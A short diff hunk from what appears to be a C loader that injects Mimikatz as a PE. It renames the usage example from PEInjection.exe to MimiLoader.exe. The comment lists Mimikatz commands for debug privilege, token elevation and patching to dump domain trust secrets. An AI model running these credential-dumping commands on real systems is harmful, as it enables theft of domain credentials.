@@ -529,7 +529,7 @@ int main(int argc, char* argv[]) {
 	/*
 		USAGE EXAMPLE:
 		(if the command has spaces you can enclose it in double quotes)
-		.\PEInjection.exe privilege::debug token::elevate "lsadump::trust /patch" coffee
+		.\MimiLoader.exe privilege::debug token::elevate "lsadump::trust /patch" coffee
 	*/
 
 	PCHAR pPeArgs = NULL;
